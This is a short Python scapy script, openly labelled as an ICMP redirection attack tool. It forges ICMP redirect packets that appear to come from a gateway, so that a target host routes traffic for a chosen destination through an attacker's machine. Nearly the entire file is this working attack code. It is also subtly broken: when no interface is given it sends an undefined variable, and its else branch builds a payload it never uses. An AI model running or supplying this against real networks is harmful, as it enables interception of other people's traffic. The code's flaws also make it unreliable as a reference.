from scapy.layers.inet import IP, ICMP, UDP, Ether
from scapy.sendrecv import send
import scapy.all as scapy
import argparse


parser = argparse.ArgumentParser(description="Performs an ICMP redirection attack.")
parser.add_argument('--iface',          type=str, help="The interface to sniff ICMP on. You should be in promiscuous mode.")
parser.add_argument('--target',         type=str, required=True, help="The IP address of the target who should add the routing table cache entry.")
parser.add_argument('--destination',    type=str, required=True, help="The IP address of the destination, the 'target' will insert a route for this IP via the 'attacker'.")
parser.add_argument('--gateway',        type=str, required=True, help="The IP address of the gateway which is used in the route entry.")
parser.add_argument('--attacker',       type=str, required=True, help="The IP address of the attacker.")
parser.add_argument('--redirect_code',  type=int, help="The redirect code from ICMP redirect RFC. Supports values 0, 1, 2, and 3. Default is 1 to redirect datagrams for the Host.", default=1)
args = parser.parse_args()


# http://blog.packetheader.net/2010/06/better-spoofing-of-icmp-host-redirect.html

def process_packet(packet):
    packet.show()

# IP layer
ip     = IP()
ip.src = args.gateway
ip.dst = args.target

# https://datatracker.ietf.org/doc/html/rfc792
#    0                   1                   2                   3
#    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#   |     Type      |     Code      |          Checksum             |
#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#   |                 Gateway Internet Address                      |
#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#   |      Internet Header + 64 bits of Original Data Datagram      |
#   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
#ICMP redirect codes 
# 0 = Redirect datagrams for the Network. 
# 1 = Redirect datagrams for the Host. 
# 2 = Redirect datagrams for the Type of Service and Network. 
# 3 = Redirect datagrams for the Type of Service and Host.
 
# ICMP Redirect layer
icmp      = ICMP()
icmp.type = 5
icmp.code = args.redirect_code  
icmp.gw   = '.'.join(args.attacker.split('.')[::-1])

#internet header payload, this can be sniffed instead of manually created for better results against modern OS.
if args.iface:
    # build a sniffer, we're going to send a spoofed ICMP packet and then sniff the response
    #reply = scapy.sr1(IP(src=args.destination, dst=args.target)/ICMP(type=8, seq=1, id=1), iface=args.iface)
    print("Sniffing!")
    req = scapy.sniff(iface=args.iface, filter=f"icmp and src host {args.target}", count=1)
    
    req[0][Ether].payload.show()

else:   
    ip_payload     = IP()
    ip_payload.src = args.target
    ip_payload.dst = args.destination



send(ip/icmp/req[0].payload)
